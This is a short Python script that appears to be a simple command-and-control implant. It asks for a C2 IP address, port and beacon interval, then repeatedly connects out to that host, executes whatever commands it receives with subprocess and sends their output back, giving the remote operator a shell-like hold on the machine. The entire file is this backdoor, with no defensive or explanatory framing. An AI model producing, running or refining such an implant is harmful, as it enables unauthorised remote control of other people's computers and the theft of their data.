#!/usr/bin/python3

# Standard libraries only
import socket
import subprocess
import time

# Initialize variables from user input
rhost = str(input("C2 IP Address: " ))
rport = int(input("C2 Port: "))
wait = int(input("Beacon interval in seconds: "))
rserver = (rhost, rport)
cmd = []

# Connect out and if server is up, retrieve a command and send back the stderr/stdout
def phone_home():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(rserver)
    except socket.error:
        print("Dad isn't home")
    else:
        while True:
            data = s.recv(1024).decode()
            cmd.append(data)
            if data is None:
                s = None
                break
            else:
                print(cmd)
                for c in cmd:
                    cmdarg = (c).split(" ")
                    execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    s.sendall(bytes(execute.stdout, "utf-8"))
                    data = None
                    cmd.remove((c))

# Close socket and take a break.
while True:
    phone_home()
    time.sleep(wait)